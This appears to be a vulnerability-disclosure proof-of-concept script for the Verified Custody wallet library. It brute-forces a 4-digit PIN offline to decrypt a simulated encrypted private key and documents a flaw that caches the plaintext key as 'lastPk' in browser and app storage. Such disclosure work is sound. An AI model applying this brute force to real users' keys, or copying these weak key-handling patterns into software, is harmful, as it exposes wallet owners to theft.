// PoC: Demonstrates how Verified Custody derives secretKey from vaultPin and decrypts encryptedPk.
// Also documents the Critical issue: plaintext private key cached as "lastPk" in storage.
//
// Requirements:
//   npm i @verified-network/verified-custody ethers
//
// Run:
//   node poc_lastPk_and_pin_bruteforce.cjs

const { encryptString, decryptString } = require("@verified-network/verified-custody");
const { encodeBytes32String } = require("ethers");

function now() {
  return Date.now();
}

// Mimics contracts.ts line 652: secretKey = encodeBytes32String(vaultPin)
function deriveSecretKeyFromPin(pin) {
  return encodeBytes32String(pin);
}

async function main() {
  console.log("=== PoC: PIN-derived encryption key + offline brute force ===");

  // Simulated victim setup (matches real logic path):
  const victimPk = "0x" + "11".repeat(32); // 32-byte hex private key-like string
  const victimPin = "0420";

  const secretKey = deriveSecretKeyFromPin(victimPin);
  const encryptedPk = encryptString(victimPk, secretKey);

  console.log("Victim PK (simulated):", victimPk);
  console.log("Victim PIN:", victimPin);
  console.log("Encrypted PK:", encryptedPk);

  // Offline brute force over 4-digit PIN space
  const start = now();
  let attempts = 0;
  let found = null;

  for (let i = 0; i <= 9999; i++) {
    const pin = String(i).padStart(4, "0");
    attempts++;

    const k = deriveSecretKeyFromPin(pin);
    let pt = "";
    try {
      pt = decryptString(encryptedPk, k);
    } catch {
      // ignore (CryptoJS may throw for malformed UTF-8)
      continue;
    }

    // Check for a realistic PK marker (here: exact match)
    if (pt === victimPk) {
      found = pin;
      break;
    }
  }

  const elapsedMs = now() - start;
  console.log({
    found,
    elapsedMs,
    attempts,
    attemptsPerSec: Math.round((attempts / elapsedMs) * 1000),
  });

  console.log("\n=== Critical issue note (plaintext lastPk) ===");
  console.log(
    [
      "In src/services/contracts.ts the code caches the plaintext private key as `lastPk`",
      "in persistent storage before confirmParticipant completes:",
      "- chrome.storage.local.set({ lastPk: userPk })",
      "- localStorage.setItem('lastPk', userPk)",
      "- AsyncStorage.setItem('lastPk', userPk)",
      "This is a direct private key exposure if storage is readable or if cleanup is skipped on failures/crashes."
    ].join("\n")
  );
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
